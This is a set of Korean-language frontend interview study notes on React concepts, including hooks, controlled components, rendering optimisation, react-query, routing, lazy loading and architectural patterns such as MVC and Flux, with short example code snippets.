- HOC(High Order Component)는 고차 컴포넌트이며 컴포넌트를 인자로 전달받아 컴포넌트를 반환하는 컴포넌트이다. 보통 관심사 분리, 기능 확장, 고차 컴포넌트 재사용 등을 위해 사용한다.

```jsx
const withHOC = (WrappedComponent) => {
  const newProps = {
    loading: false,
  };
  return (props) => {
    return <WrappedComponent {...props} {...newProps} />;
  };
};
```

<br>

### # 고차함수(Higher order function)

- 고차 함수는 함수를 인자로 전달받거나 함수를 결과로 반환하는 함수를 말한다.

<br>

### # **컴포넌트와 엘리먼트의 차이점은?**

- 엘리먼트

  DOM element(태그)를 나타내는 일반적인 객체

- 컴포넌트

  props를 받아 DOM 엘리먼트의 정보를 담은 react 엘리먼트 객체를 출력하는 함수 혹은 클래스이다. react에서 index 파일 내부 ReactDOM.createRoot 함수를 통해 컨테이너 돔(ex `<div id="root"></div>`)을 지정하고 컴포넌트에서 return 되는 react 엘리먼트 객체를 컨테이너 돔의 메소드인 render 메소드를 통해 컨테이너 돔 내부에 렌더링한다.

  ```javascript
  // 컨테이너 돔 지정
  const root = ReactDOM.createRoot(document.getElementById("root"));

  const element = <h1>Hello, world</h1>; // DOM 엘리먼트의 정보를 담은 리액트 엘리먼트 객체 생성
  root.render(element); // 컨테이너 돔 내부에 리액트 엘리먼트 렌더링
  ```

<br>

### # useEffect와 useLayoutEffect 차이

<br>

- 둘의 사용법은 완전히 동일하다. 둘의 차이점은 useEffect는 DOM이 화면에 그려진 후(브라우저 렌더링 단계 중 페인트 완료 후)호출되고 useLayoutEffect는 DOM을 그리기 전(렌더, 커밋 페이즈 단계가 완료 된 후 브라우저의 페인트 단계 전) 호출된다.

  예를 들어 useEffect 내부에서 state를 업데이트하여 DOM에 내용을 채운다고 가정했을 때 DOM을 렌더링 한 후 useEffect를 호출하여 state를 업데이트하고 리렌더링을 수행하여 DOM에 내용을 채우는 것이다. 하지만 DOM에 갯수가 많아지고 복잡해지면 렌더링 시간이 증가하게 되어 useEffect 사용 시 state가 업데이트 되지 않은 상태를 사용자가 볼 위험이 생긴다.

  이런 경우 useLayoutEffect를 사용하여 문제를 해결할 수 있다.

  ```
  // useEffect
  (1) `<div>그의 이름은 이며, 나이는 0살 입니다.</div>` 를 페인트
  (2) useEffect 이펙트 내부의 setAge(31), setName("재민") 호출
  (3) 리렌더링 수행 -> `<div>그의 이름은 재민이며, 나이는 31살 입니다.</div>`

  // useEffectLayout
  (1) useEffectLayout 이펙트 내부의 setAge(31), setName("재민") 호출
  (2) 리렌더링 수행 -> `<div>그의 이름은 재민이며, 나이는 31살 입니다.</div>`
  ```

<br>

### # useReducer

- useReducer

  useReducer는 useState와 같이 state를 관리하고 업데이트할 수 있는 hook이다. useState와의 차이는 useReducer는 state 변경에 관한 로직을 묶어서 관리한다. useReducer를 사용하면 state 관련 로직을 묶어서 사용하므로 가독성을 향상시키고 유지보수를 용이하게 할 수 있다. 만약 state가 단순한 값이 아닌 여러 값으로 변경된다면 useReducer를 사용하는 것이 좋을 수 있다. 사용법은 redux와 비슷하다. reducer를 생성하고 useReducer에 인자로 생성한 리듀서와 state 초기 값을 전달한다. 그리고 setState 대신 dispatch를 통해 action 타입을 전달해 state를 업데이트시킨다.

  ```jsx
  import { useReducer } from "react";

  function reducer(state, action) {
    switch (action.type) {
      case "INCREMENT":
        return state + 1;
      case "DECREMENT":
        return state - 1;
      default:
        return state;
    }
  }

  function App() {
    const [number, dispatch] = useReducer(reducer, 0);

    const onIncrease = () => {
      dispatch({ type: "INCREMENT" });
    };

    const onDecrease = () => {
      dispatch({ type: "DECREMENT" });
    };

    return (
      <div>
        <h1>{number}</h1>
        <button type="button" onClick={onIncrease}>
          +1
        </button>
        <button type="button" onClick={onDecrease}>
          -1
        </button>
      </div>
    );
  }
  ```

<br>

### # SVG 컴포넌트화

- svgr/webpack 라이브러리를 활용하여 SVG를 컴포넌트로 사용할 수 있다. SVG를 컴포넌트로 사용하는 경우 크기, 색상 등의 커스텀을 할 수 있어 재사용성이 증가된다.

<br>

### # 커스텀 훅(custom hook)

- 커스텀 훅이란 개발자가 만들어 사용하는 훅으로 특정 상태 관리나 로직을 재사용하도록 별도의 파일로 분리하여 처리하는 훅을 이야기한다. 커스텀 훅의 사용 이유는 관심사의 분리, 특정 상태 관리 및 로직의 재사용 등의 이유로 사용한다.

  ```javascript
  import { useState, useCallback } from "react";

  function useInputs(initialForm) {
    const [form, setForm] = useState(initialForm);
    // change
    const onChange = useCallback((e) => {
      const { name, value } = e.target;
      setForm((form) => ({ ...form, [name]: value }));
    }, []);
    const reset = useCallback(() => setForm(initialForm), [initialForm]);
    return [form, onChange, reset];
  }

  export default useInputs;
  ```

<br>

### # 로그인 버튼을 누른 후 처리가 지연 되고 있는 순간에 다른 UI 버튼을 클릭한다면 처리는 어떻게 되는가? 비동기 처리라고 한다면 이건 문제가 있지 않은가? (API 요청 처리 전 컴포넌트 언마운트)

- 대부분 로그인이 필요한 서비스의 경우 로그인 하지 않은 사용자가 UI를 조작하게 되면 로그인 페이지로 리다이렉트 시키는데 만약 비동기 통신을 통해 액세스 토큰을 받아오는 로그인 과정이 지연되는 경우 스피너같은 로딩 화면을 띄워 토큰을 받아오기 전 사용자가 다른 UI를 누를 수 없도록 방지할 것 같다. 만약 예외 처리를 하지 않은 경우 API를 요청한 컴포넌트가 언마운트되면 이후 동기적으로 처리하는 로직에서 문제가 발생하거나 메모리 누수가 발생할 수 있다.

- 만약 특정 컴포넌트 내에서 API 요청 후 페이지를 이동하여 해당 컴포넌트가 언마운트되는 경우 후속 처리에서 setState를 하는 경우 메모리 누수 이슈가 발생할 수 있다. 즉 처리 전 언마운트 되기 때문이다. 이럴 때 useEffect의 cleanup으로 처리해줘야한다.

<br>

### # 제어 컴포넌트와 비제어 컴포넌트 차이

- 제어 컴포넌트

  컴포넌트의 state나 props로 입력 폼 값이 제어되는 컴포넌트이다. 예시로 input의 value 값을 useState로 값을 업데이트 시키는 것이 대표적인 제어 컴포넌트의 예시이다. 데이터와 UI가 항상 동기화되어 입력 값 발생 시 계속 리렌더링 되어 최신화가 유지된다. 유효성 검사나 조건부 버튼 활성화에 사용한다.

  ```jsx
  // 제어 컴포넌트 예시
  export default function App() {
    const [input, setInput] = useState("");

    const onChange = (e) => {
      setInput(e.target.value);
    };

    return (
      <div className="App">
        <input onChange={onChange} />
      </div>
    );
  }
  ```

- 비제어 컴포넌트

  DOM 자체에서 입력 폼 데이터를 다루는 컴포넌트이다. 예시로 input에 ref 속성을 할당하여 입력 폼을 제출할 때 값을 업데이트 시키는 것이 대표적인 비제어 컴포넌트의 예시이다. 데이터와 UI가 동기화되어 있지 않아 입력 값 발생 시 리렌더링 되지 않고 입력 폼을 제출할 때 렌더링된다. 일회성 정보 검색이나 제출 시 값 검증에 사용한다.

  ```jsx
  // 비제어 컴포넌트
  export default function App() {
    const inputRef = useRef();

    const onClick = () => {
      console.log(inputRef.current.value);
    };

    return (
      <div className="App">
        <input ref={inputRef} />
        <button type="submit" onClick={onClick}>
          전송
        </button>
      </div>
    );
  }
  ```

<br>

### # 리액트의 렌더링 성능 향상 방법

1. 렌더링 성능 측정

- react developer tools 익스텐션으로 컴포넌트 렌더링 성능을 측정하여 개선한다.

- 구글 라이트하우스를 활용하여 FCP, LCP, TBT, CLS, SI, TTI 등의 성능을 측정하고 개선한다. FCP는 최소 3초 LCP는 최소 4초 이내에 들어야한다. 해당 시간이 벗어나면 사용자가 서비스에서 이탈할 확률이 증가한다.

- 함수 성능 측정은 perpomance API나 console.time 메소드를 활용하여 측정하고 개선한다.

2. useMemo, useCallback, React.memo

- useMemo, useCallback, React.memo 등을 사용하여 값, 함수, 컴포넌트를 메모이제이션하여 재사용한다.

3. 코드 스플리팅

- Lazy와 Suspense를 사용하여 코드 스플리팅하고 번들의 크기를 줄여 당장 필요한 컴포넌트만 우선적으로 렌더링하도록 한다.

4. 이미지 사이즈 최적화

- 이미지를 압축율이 좋은 이미지 포맷으로 변경한다. 예를 들면 avif 포맷으로 변경할 수 있다. 하지만 이와 같은 경우 해당 이미지 포맷의 호환되는 브라우저 확인은 필수이다. 다만 nextjs에서는 이미지 컴포넌트가 자동으로 사용자 브라우저에 호환되는 이미지 포맷으로 변환해주기 때문에 확인이 불필요하다.

- 이미지를 사용자에게 보여지는 레이아웃 크기를 고려하여 사이즈를 줄인다. 예를 들면 canvas를 사용하여 이미지를 리사이징해서 사용 및 저장하거나 img 태그의 srcset 속성을 활용하여 뷰포트 별 이미지를 제공할 수 있다. 또한 고정 사이즈를 사용하여 리플로우를 최소화할 수 있다. 또한 nextjs의 경우 기본적으로 사용하는 이미지 로더를 squoosh에서 sharp로 바꾸는 것만으로도 이미지 최적화에 도움이 된다. -> 이미지 최적화 라이브러리인 sharp의 경우 next15 버전부터 자동으로 sharp를 사용하므로 수동으로 설치할 필요가 없다.

- IntersectionObserver API와 같이 뷰포트를 감지하는 API를 활용하여 해당 이미지 보여져야 할 때 서버에 요청을 보내 이미지를 가져오는 이미지 레이지 로딩을 활용한다.

5. 애니메이션 최적화

- 애니메이션은 리플로우와 리페인트를 발생시키는 원인이다. witdh와 같은 크기를 직접적으로 변경하는 애니메이션의 경우 cpu에서 처리하게 되는데 transform의 scale을 활용하여 크기를 변경시키는 경우 gpu에서 처리하게 되므로 성능 향상에 도움이 된다.

6. 웹폰트 경량화

- 사용할 글자만 남겨놓은 서브셋 파일을 활용하여 웹폰트 파일의 크기를 줄인다.

- WOFF2, WOFF와 같은 최적화 폰트를 사용한다.

7. state와 props변경 최소화

- state와 props의 변경을 최소화하여 리렌더링을 최소화한다. 또한 한 컴포넌트에 state를 몰아서 사용하는 경우 state 변화가 빈번하게 발생할 수 있기 때문에 state를 사용하는 컴포넌트 내부에 작성할 수 있도록 한다. 또한 객체 형태의 state의 경우 객체 프로퍼티 중 하나만 사용하는 컴포넌트가 있거나 하는 경우 분리해서 사용하는 것이 좋다.

8. 프롭시 드릴링(props drilling) 피하기

- 부모 컴포넌트에서 자식 컴포넌트로 전달하는 프롭스의 깊이가 깊어질수록 성능에 좋지 않다. 부모의 state가 변경되면 자식 컴포넌트 모두 리렌더링되기 때문이다. 또한 해당 props를 사용하지 않는 컴포넌트를 거치는 경우도 생기며 컴포넌트끼리 결속되어 재사용성이 떨어진다. 개인적으로 2번 이상 넘겨주지 않도록 기준을 정해서 작업하고 있다. 넘어가는 경우 전역 상태 관리 라이브러리를 사용하여 해결할 수 있다.

9. 패키지 정리

- 사용하지 않는 패키지 제거 및 dependencies와 devDependencies를 잘 구분하여 디벨롭 환경에서만 필요한 패키지가 번들에 포함되지 않도록 함

10. 적극적인 캐싱 데이터 사용

- tanstack query와 같은 라이브러리 사용 시 캐싱 데이터를 적극적으로 활용하여 불필요한 리패치를 막는다.

<br>

### # map의 key 사용

- index값은 사용하지 않는다. 만약 배열의 순서가 수정될 경우 중복되는 key값이 발생할 수 있기 때문이다. 그렇기 때문에 유니크한 값을 사용하기 위해 map 메소드를 사용한 배열 요소가 id값을 가지고 있다면 id값을 사용하도록 하고 있다. id값이 존재하지 않다면 가지고 있는 다른 유니크한 값을 사용하거나 배열 요소 자체를 문자열로 변환 후 조합하여 사용하기도 한다.

<br>

### # prop drilling

- prop drilling은 부모 컴포넌트에서 하위 컴포넌트로 props를 전달하는 것을 과정을 말한다. prop drilling이 깊어지게 되면 해당 props의 추적이 어려워져 유지보수가 힘들어지고 실제 props를 사용하는 컴포넌트 사이에 props를 사용하지 않는 컴포넌트도 포함될 수 있다. 또한 부모에 props가 변경되면 하위 컴포넌트들도 모두 리렌더링 되기 때문에 성능 저하에 원인이 될 수 있다. 그렇기 떄문에 prop drilling을 최대한 피해주는 것이 좋은데 prop drilling을 피하는 방법으로는 대표적으로 전역 상태 관리 라이브러리를 사용하거나 컴포넌트를 잘게 쪼개지 않고 가장 가까운 부모 컴포넌트와 props를 공유할 수 있도록 유도하는 것이다.

<br>

### # 얕은 비교(shallow equal) vs 깊은 비교(deep equal)

- 얕은 비교

  얕은 비교는 참조 주소(참조하는 값에 메모리 주소)를 비교한다. react의 경우 state, props, hook의 의존성 배열 값 등은 얕은 비교를 통해 값의 변화를 감지한다.

- 깊은 비교

  참조 주소 및 값까지 비교한다.

<br>

### # 리액트 에러바운더리 컴포넌트와 서스펜스 컴포넌트

- ErrorBoundary 컴포넌트는 자식 컴포넌트의 런타임 시 에러가 발생하는 경우 fallback 속성에 할당한 대체 레이아웃을 제공하기 위해 사용한다. 또한 react query 사용 시 useErrorBoundary 옵션을 true로 설정하여 isError를 대체할 수 있다. 또 ErrorBoundary는 Suspense와 함께 많이 사용된다. Suspense 컴포넌트는 자식 컴포넌트의 렌더링 지연 시 fallback 속성에 할당한 대체 레이아웃을 제공하기 위해 사용한다. React.lazy와 함께 코드스플리팅을 위해서도 사용된다. 또한 ErrorBoundary와 마찬가지로 react query와 함께 사용할 수 있다. useQuery에 suspence 옵션을 true로 설정하여 isLoading을 대체할 수 있다. nextjs에서는 Suspense 컴포넌트를 loading 파일, ErrorBoundary 컴포넌트를 error 파일로 대체해서 사용할 수 있다.

<br>

### # Client Side Routing

- 라우팅은 사용자가 웹사이트 내에서 페이지를 이동하는 과정이다. 서버 사이드 라우팅의 경우 페이지 이동 시 모든 데이터를 새로 요청하게 되어 화면 깜빡임이 발생한다. 반면 클라이언트 사이드 라우팅은 실제 페이지를 전환하는 것이 아닌 Javascript를 통해 페이지를 전환하고 필요한 데이터만 추가로 요청하기 때문에 라우팅 속도도 빠르고 화면 깜빡임이 발생하지 않는다. react와 마찬가지로 nextjs에서도 Link 컴포넌트를 사용하면 클라이언트 사이드 라우팅을 할 수 있다. 반면 a 태그를 사용하면 서버 사이드 라우팅한다. (예시: 리액트 라우터는 클라이언트 사이드 라우팅)

<br>

### # react-query (tanstack query)

- react-query란?

  react-query 라이브러리는 비동기 통신을 편리하게 하기 위한 라이브러리이다. react-query의 useQuery를 통해 받아온 데이터는 캐싱할 수 있고 캐싱 된 데이터는 key값을 통해 컴포넌트 간 공유하여 API 호출을 최적화할 수 있다. 또한 useQuery가 반환하는 data, isLoading, isError 등을 통해 데이터나 예외 처리를 쉽게 할 수 있으며 retry와 같은 옵션을 사용하여 요청 실패 시 재요청을 시도할 수 있고, enable과 같은 옵션을 활용하여 조건이 부합하는 경우에만 API를 호출할 수 있고, staleTime이나 cacheTime과 같은 옵션을 활용하여 캐싱 데이터의 최신화를 관리할 수 있다는 장점이 있다. 또한 이 외에도 onSuccess, onError, onSettled(온새틀리드)를 통해 요청 상태에 따른 추가적인 후속 처리를 할 수도 있다. 또한 데이터 조회 시 useQuery를 사용하였다면 데이터 추가, 갱신, 삭제 시에는 useMutation을 사용한다. useMutation가 반환하는 mutate를 통해 API를 호출할 수 있다.

  ```jsx
  // useQuery 예시
  const Todos = () => {
    const { isLoading, isError, data, error } = useQuery(
      "todos",
      fetchTodoList,
      {
        staleTime: 2 * 60 * 1000,
        cacheTime: Infinity,
        retry: 0,
        onSuccess: (data) => {
          console.log(data);
        },
        onError: (error) => {
          console.log(error.message);
        },
      }
    );

    if (isLoading) {
      return <span>Loading...</span>;
    }

    if (isError) {
      return <span>Error: {error.message}</span>;
    }

    return (
      <ul>
        {data.map((todo) => (
          <li key={todo.id}>{todo.title}</li>
        ))}
      </ul>
    );
  };
  ```

  ```jsx
  // useMutation 예시
  function App() {
    const fetchAdd = async (info) => {
      const { data } = await axios.post(`/add`, info);

      return data;
    };

    const { mutate, isLoading, isSuccess, isError } = useMutation(fetchAdd, {
      onMutate: (variables) => {
        // variables : {id: 1}
        console.log("onMutate", variables);
      },
      onError: (error, variables, context) => {
        // error
      },
      onSuccess: (data, variables, context) => {
        console.log("success", data, variables, context);
      },
      onSettled: (data, error, variables, context) => {
        // end
      },
    });

    const handleSubmit = () => {
      // onMutate 실행 => 성공시 onSuccess 실행 => 끝나면 onSettled 실행
      mutate({ id: 1 });
    };
  }
  export default App;
  ```

- staleTime (리패치 관련, 최신화 관련)

  데이터가 fresh 상태로 유지되는 시간을 지정한다. fresh 상태일 때는 해당 데이터를 재요청하지 않는다. stale 상태가 되는 경우 캐싱 데이터와 무관하게 재요청하여 최신 데이터 상태를 유지하도록 한다.

- cacheTime (메모리에 캐시 유지 시간)

  데이터가 캐싱되는 시간을 결정한다. 해당 시간이 지나면 가비지 콜렉터로 수집되어 사용할 수 없게 된다. 나같은 경우 보통 cacheTime을 Infinity로 설정하고 staleTime을 설정하여 캐싱 데이터를 업데이트하였다.

- enable

  enable 내부에 삼항연산자나 조건을 할당하여 조건에 맞는 시기에 호출할 수 있다.

<br>

### # 동적 라우팅

- react-router-dom에 Route 컴포넌트에 path 경로를 콜론 뒤에 변수로 지정하고 아이템 리스트에서 리스트 클릭 시 해당 아이템에 유니크한 id값을 path 경로로 지정해주어 동적 라우팅을 구현하였다. nextjs는 동적 라우팅을 적용할 파일 네임을 대괄호로 지정하여 구현할 수 있다.

  ```jsx
  // Router.js
  <Route path="/productDetail/:id" element={<ProductDetail />} />;

  // ProductList.js
  const goToDetail = (productId) => {
    navigate(`/productDetail/${productId}`);
  };
  ```

<br>

### # 페이지 네이션 구현 방법

- 한 페이지에 보여 줄 데이터 수, 페이지 넘버 등의 정보가 담겨있는 쿼리 스트링을 백엔드와 지정하여 맞춘 뒤 url에 useSearchParams와 같은 hook을 이용하여 url에 백엔드와 맞춘 쿼리 스트링이 포함되도록 지정하고 이전 페이지나 다음 페이지로 이동 시 url의 포함 된 쿼리 스트링을 useLocation과 같은 hook으로 가져온 뒤 location에 search key에 접근하여 해당 데이터를 요청하면 페이지 네이션을 구현할 수 있을 것 같다.

<br>

### # 디자인 패턴 (https://velog.io/@iamjoo/mvc-mvp-mvvm-flux-%EB%94%94%EC%9E%90%EC%9D%B8-%ED%8C%A8%ED%84%B4-86ocg4bf)

- MVC 패턴

  - 구조

    1. 모델 : 데이터 처리 담당

    2. 뷰 : 화면 처리 담당

    3. 컨트롤러 : 사용자의 입력을 받고 모델과 뷰에 중간 역할

  - 동작

    ![mvc](https://user-images.githubusercontent.com/85284246/178215067-a4f2ddbe-0f4a-41be-9683-e22f62d37771.png)

    1. 사용자의 액션들은 컨트롤러에 들어오게 된다.

    2. 컨트롤러는 사용자의 액션을 확인하고, 모델을 업데이트한다.

    3. 컨트롤러는 모델을 나타내줄 뷰를 선택한다.

    4. 선택 된 뷰는 업데이트 된 모델을 이용하여 화면을 나타낸다.

  - 장점 : 패턴의 사용이 단순하다.

  - 단점 : 뷰와 모델 사이의 의존성이 높다. 높은 의존성 때문에 어플리케이션이 커질수록 복잡하지고 유지보수가 어렵게 만들 수 있다.

<br>

- MVP 패턴

  - 구조

    1. 모델 : 데이터 처리 담당

    2. 뷰 : 사용자로부터의 입력을 받고, 화면 처리 담당

    3. 프레젠터 : 뷰와 모델 사이에 자료 전달 역할

  - 동작

    ![mvp](https://user-images.githubusercontent.com/85284246/178215069-6c1d8fb3-201e-4d31-b138-b4b1457cca66.png)

    1. 사용자의 액션들은 뷰를 통해 들어오게 된다.

    2. 뷰는 데이터를 프레젠터에 요청한다. 이 때 관계는 1대1 관계이다.

    3. 프레젠터는 모델에게 뷰 업데이트에 필요한 데이터를 요청한다.

    4. 모델은 프레젠터에게 요청받은 데이터를 응답한다.

    5. 프레젠터는 뷰에게 데이터를 응답한다.

    6. 뷰는 프레젠터가 응답한 데이터를 이용하여 화면을 나타낸다.

  - 장점 : 프레젠터를 통해서만 데이터를 전달 받기 때문에 뷰와 모델의 의존성이 없다.

  - 단점 : 뷰와 프레젠터 사이의 의존성이 높다.

<br>

- MVVM 패턴

  - 구조

    1. 모델 : 데이터 처리 담당

    2. 뷰 : 사용자로부터의 입력을 받고, 화면 처리 담당

    3. 뷰모델: 뷰와 모델 사이에 매개체 역할

  - 동작

    ![mvvm](https://user-images.githubusercontent.com/85284246/178215072-2a197512-1d58-458d-8bef-3893678a5bef.png)

    1. 사용자의 액션들은 뷰를 통해 들어오게 된다.

    2. 뷰는 데이터를 뷰모델에 요청한다.

    3. 뷰모델은 모델에게 뷰 업데이트에 필요한 데이터를 요청한다.

    4. 모델은 뷰모델에게 요청받은 데이터를 응답한다.

    5. 뷰는 뷰모델과의 데이터 바인딩(데이터를 묶어 동기화시킨다)을 이용해 화면을 갱신한다.

  - 장점 : 뷰와 모델 사이의 의존성이 없고 뷰모델은 모델하고만 소통을 하고 데이터만 관리하는 방식으로 뷰와의 의존성을 없앴다.

  - 단점 : 뷰모델의 설계가 어렵다.

<br>

- FLUX 패턴 : FLUX패턴은 MVC 패턴의 단점을 개선하고자 등장했다. 페이스북에서는 뷰에서 사용자 입력을 받아 모델과 뷰 사이에 양방향 데이터 흐름을 가지도록 만들었는데 애플리케이션의 규모가 커질수록 데이터 흐름을 파악하기가 어렵고 복잡도가 증가하여 예상치 못한 에러가 발생한다는 문제가 있었다. 그래서 나온 것이 FLUX 패턴이다. FLUX패턴은 항상 디스패치, 스토어, 뷰, 액션으로 데이터가 전달되며 액션을 통해 다시 디스패치로 데이터가 전달되는 단방향 데이터 흐름을 가지고 있다. 또한 FLUX 패턴의 일부분을 적용시킨 것이 전역 상태 관리 라이브러리인 리덕스와 몹엑스이다.

  - 구조와 동작순서 : 액션, 디스패처, 스토어, 뷰(컨트롤러 뷰)

    ![flux](https://user-images.githubusercontent.com/85284246/178215058-06245ee4-fa91-46ce-9497-c21dc423131b.png)

    1. 액션 : 액션 생성자를 통해 디스패처에게 액션 객체를 전달한다.

    2. 디스패처 : 액션 객체를 받아 액션 객체의 타입을 정의하여 스토어에 전달한다.

    3. 스토어 : 액션 객체 타입을 받아 참고하여 상태를 업데이트 시키고 상태를 저장한다.

    4. 뷰 : 컨트롤러 뷰는 스토어의 상태 변경 시 스토어의 데이터를 가져와 자식 뷰에게 분배한다.

  - 장점 : 단방향 데이터 흐름으로 데이터 흐름을 파악하기 쉽기 때문에 예상하지 못한 에러를 방지할 수 있다.

  - 단점 : FLUX 패턴을 적용한 라이브러리는 비교적 러닝 커브가 높은 편이다.

- Atomic 패턴 : 텍스트나 버튼처럼 가장 작은 단위의 컴포넌트인 Atom 부터 Molecule, Organism, Template, Page 단위로 컴포넌트를 구분, 이때 Page 단위 컴포넌트에서는 데이터의 패칭 및 가공을 담당하고 그 하위 단위의 컴포넌트들은 뷰만을 책임지는 프레젠테이셔널 컴포넌트로 분리함으로써 컨테이너와 프레젠테이셔널 컴포넌트의 역할을 명확하게 구분 (루머에서 지금예약 운영 시 사용했던 디자인 패턴)

- react 패턴 (Presentational and Container Pattern) : 기능만을 담는 컴포넌트와, 뷰만을 담는 컴포넌트로 분리하는 패턴이다. 담당하는 기능이 분리되어 있기 때문에 가독성이 높고, 유지보수가 쉽고 재사용성이 뛰어나다. 또 같은 state를 다른 container에게 props 내림으로 상태를 공유 할 수 있다.

  - 프레젠테이셔널 컴포넌트(present component)

    뷰를 담는 컴포넌트이다. 상태가 없는 컴포넌트(stateless component)라고도 불린다. state를 직접 조작하지 않으며, 컨테이너 컴포넌트가 내려준 props를 사용한다. state 관련 훅을 사용하지 않고 state를 거의 가지지 않으며 만약 state를 가지고 있다면 데이터에 관한것이 아닌 ui 상태에 관한 state를 가지고 있다.

  - 컨테이너 컴포넌트(container component)

    기능을 담는 컴포넌트이다. 상태가 있는 컴포넌트(stateful component)라고도 불린다. 어떤 동작을 하고 어떤 로직을 수행하는지와 관련이 있다. 마크업을 하지 않고 스타일을 사용하지 않는다. 데이터와 데이터 조작에 관한 함수를 만들고 프레젠테이셔널 컴포넌트에 제공한다.

- 합성 컴포넌트 패턴 : 컴포넌트를 기능별로 나누어 합성(Composition)으로 조립, 반복되는 로직은 커스텀 훅으로 추출, 즉 한 컴포넌트 내에서 해당 컴포넌트에 종속되는 여러 컴포넌트들을 만들어 외부에서 조합해서 사용

- 기능기반 구조 패턴(Feature-based Folder Structure) : 기능 단위(페이지나 도메인)로 폴더를 나누는 방식, 즉, 프로젝트를 특정 기능을 기준으로 디렉토리를 나누고, 그 하위에 해당 기능에 관련된 모든 파일을 배치함.

<br>

### # 웹사이트 scrolling 성능을 향상 방법

- 스크롤 이벤트의 특성 상 반복적으로 이벤트를 호출되게 되는데 스크롤 이벤트와 같이 반복적으로 호출되는 이벤트는 사용하지 않는 이벤트를 제거(실행 중지)하기 위해 클린업 함수를 적용시켜야한다. 만약 스크롤 이벤트에서 클린업 함수로 처리를 하지 않는 경우 모든 이벤트가 실행되거나 메모리에서 제거되지 않기 때문에 성능 이슈가 발생한다. removeEventListener를 통해 클린업 함수를 만들어 클리어 처리를 해주어야 메모리 누수가 발생하지 않는다. 또한 스크롤 이벤트의 경우 쓰로틀링을 구현하여 일정 시간동안 한번만 실행되도록 구현할 수 있다. 쓰로틀링은 로대쉬(Lodash)라이브러리의 쓰로틀(throttle)로 구현하거나 직접 구현할 수 있다. 쓰로틀링 구현은 직접 구현할 경우 setTimeout을 통해 일정 시간동안 스크롤 이벤트를 실행시키고 쓰로틀링을 체크하는 boolean타입의 state를 함께 사용하여 구현할 수 있다. 또한 추가로 스크를 되는 컨텐츠 중 사용자가 보는 뷰포트 영역의 컨텐츠만 렌더링하기 위해 windowing 기법을 적용할 수 있다. windowing 기법을 편리하게 적용시키기 위한 react 라이브러리로는 react-window와 react-virtualized가 있다.

```javascript
// 클리어 처리 예시
// useEffect 는 deps 배열의 내용이 변경될 때마다 함수를 호출하고, 그 만큼 addEventListener 가 호출되면서 브라우저가 호출해야하는 함수의 갯수도 늘어난다. 아래 코드는 value 가 변경될 때마다 addEventListener 로 새로운 함수를 입력하고 있다. value 가 1 => 2 => 3 순서로 변경됐다고 가정하면 스크롤 시 우리가 원하는 결과는 콘솔 로그에 3이 출력되는 것일 텐데 하지만 removeEventListener 를 호출하지 않아서 1, 2, 3 이 각각 출력될 것이다. 만약 아래 코드에서 주석을 제거하고 클리어 처리를 하는 경우 3이 출력된다.

useEffect(() => {
  window.addEventListener("scroll", () => console.log(value));

  // return () => {
  //   window.removeEventListener("scroll", () => console.log(value));
  // };
}, [value]);
```

<br>

### # 지연 로딩(Lazy Loading)

- 지연 로딩(Lazy Loading)

  레이지 로딩은 말 그대로 지연 로딩을 말한다. 사용자가 실제로 해당 리소스를 필요로 할 때까지 다운로드를 지연시키는 기법이다. 예를 들어 사용자가 웹 사이트를 접속할 때 CSR에서는 메인 번들을 통째로 로드하게 된다. 이때 사용자가 다른 페이지에 접근하지 않으면 다른 페이지의 코드는 메인 번들에 포함될 필요가 없다.

  이런 경우 라우트 레벨에서 suspense 컴포넌트와 함께 react.lazy(next에서는 next/dynamic의 dynamic)를 활용하여 코드 스플리팅 한 후 레이지 로딩하는 방식으로 사용자가 해당 페이지에 접근할 때 쪼개진 번들을 지연 로드할 수 있게 한다. 또한 이 외에도 모달과 같은 조건부 렌더링에도 지연 로딩을 적용할 수 있다.

  또한 스크롤이 긴 페이지에서 사용자가 모든 컨텐츠를 보지 않고 나가는 경우 리소스 낭비가 발생할 수 있다. 이럴 때는 뷰포트를 관찰하여 레이지 로딩을 적용 시킬 수 있다. Intersection Observer 혹은 scroll 이벤트를 통해 컨텐츠가 뷰포트 내에 포함되는 경우 로드되도록 구현할 수 있다.

  이렇게 레이지 로딩을 적용하여 렌더링 최적화 및 리소스 낭비를 막을 수 있다.

- 요약

  - CSR에서 사용자가 다른 페이지를 사용하지 않을 때 라우트 레벨에서 코드 스플리팅하여 레이지 로딩

  - 모달과 같은 조건부 렌더링에서 지연 로딩

  - 스크롤이 긴 페이지에서 Intersection Observer 혹은 스크롤 이벤트를 활용하여 뷰포트 감지 후 레이지 로딩

  ```jsx
  // 라우트 레벨에서 코드 스플리팅
  import React, { Suspense, lazy } from "react";
  import { BrowserRouter as Router, Route, Switch } from "react-router-dom";

  const Home = lazy(() => import("./routes/Home"));
  const About = lazy(() => import("./routes/About"));

  const App = () => (
    <Router>
      <Suspense fallback={<div>Loading...</div>}>
        <Switch>
          <Route exact path="/" component={Home} />
          <Route path="/about" component={About} />
        </Switch>
      </Suspense>
    </Router>
  );
  ```

<br>

### # 트래픽 및 트래픽 초과 대응

- 트래픽이란?

  트래픽은 네트워크 상에서 일정 시간 동안 흐르는 데이터 양(즉, 데이터 전송량)이나, 사용자 요청 수 등을 의미한다.

- 트래픽 초과 대응

  - CDN, 로드 밸런서 등을 통한 트래픽 분산

  - 클라이언트 단에서는 이미지, 스크립트 등 리소스 크기를 최적화해서 전송 데이터량 줄이기 (ex 코드 스플리팅, 레이지 로딩)

  - AWS와 같은 확장성이 좋은 클라우드 컴퓨팅을 활용하여 유연한 서버 확장

  (참고 사항 : CDN과 로드 밸런서는 기본적으로 다른 유형의 도구이다. CDN의 주요 목적은 넓은 지리적 영역에 컨텐츠를 분산시켜 물리적으로 가까운 서버에 요청을 하는 방식이고, 로드 밸런서의 주요 목적은 트래픽 분산을 위해 서버를 분산하는 것을 말한다.)

<br>

### # 프로젝트를 하면서 메모리 누수(leak) 이슈가 있었는지?

